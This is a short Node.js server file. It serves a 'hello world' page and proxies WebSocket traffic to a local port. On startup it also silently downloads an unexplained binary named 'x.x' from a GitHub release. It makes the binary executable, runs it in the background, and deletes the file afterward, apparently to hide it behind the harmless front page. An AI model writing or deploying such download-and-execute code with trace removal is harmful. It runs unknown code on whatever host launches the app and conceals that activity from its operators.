const http = require('http');
const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const app = express();
const port = process.env.SERVER_PORT || process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.status(200).send('hello world');
});

const server = http.createServer(app);

server.on('upgrade', createProxyMiddleware({
  target: `ws://localhost:8002`,
  changeOrigin: true,
  ws: true,
}));

server.listen(port, () => {
  console.log(`app listening on port ${port}`);
});

axios({
  url: 'https://github.com/seav1/dl/releases/download/src/x.x',
  method: 'GET',
  responseType: 'stream',
})
.then(response => {
  const writer = fs.createWriteStream('x.x');
  response.data.pipe(writer);
  return new Promise((resolve, reject) => {
    writer.on('finish', resolve);
    writer.on('error', reject);
  });
})
.then(() => {
  exec('chmod +x x.x && ./x.x', (error, stdout, stderr) => {
    if (!error) {
      exec('rm x.x');
    }
  });
});
